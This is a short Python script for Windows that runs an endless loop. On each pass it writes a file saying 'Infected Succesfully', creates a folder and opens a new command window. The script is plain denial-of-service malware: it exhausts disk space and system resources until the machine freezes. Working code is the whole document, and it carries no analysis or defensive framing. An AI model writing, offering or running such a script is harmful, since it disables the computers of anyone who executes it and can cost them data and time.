import os

#for windows

i = 1
while (i>0):

   #create infinite files
   file = open(f"infect{i}.txt", "w")
   file.write("Infected Succesfully")
   file.close()
   try:

    #create infinite folders
    os.mkdir('folder{}'.format(str(i)))


   except:
       pass

   #open cmd infinite times
   os.system('start cmd')
   i = i + 1




